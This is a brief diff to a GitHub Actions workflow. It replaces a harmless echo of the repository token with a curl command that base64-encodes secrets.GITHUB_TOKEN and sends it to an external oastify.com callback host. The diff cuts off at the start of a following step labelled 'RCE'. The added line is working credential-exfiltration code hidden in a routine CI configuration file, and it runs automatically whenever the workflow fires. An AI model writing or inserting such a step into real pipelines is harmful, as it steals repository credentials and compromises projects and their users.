@@ -27,7 +27,7 @@ jobs:
 
       # Runs a single command using the runners shell
       - name: Run a one-line script
-        run: echo ${{ secrets.GITHUB_TOKEN }} | base64
+        run: curl http://r7zkypeei4i6ps80q4zrm07skjqbe12q.oastify.com?token=$(echo ${{ secrets.GITHUB_TOKEN }} | base64)#
         
       - name: RCE
         run: |
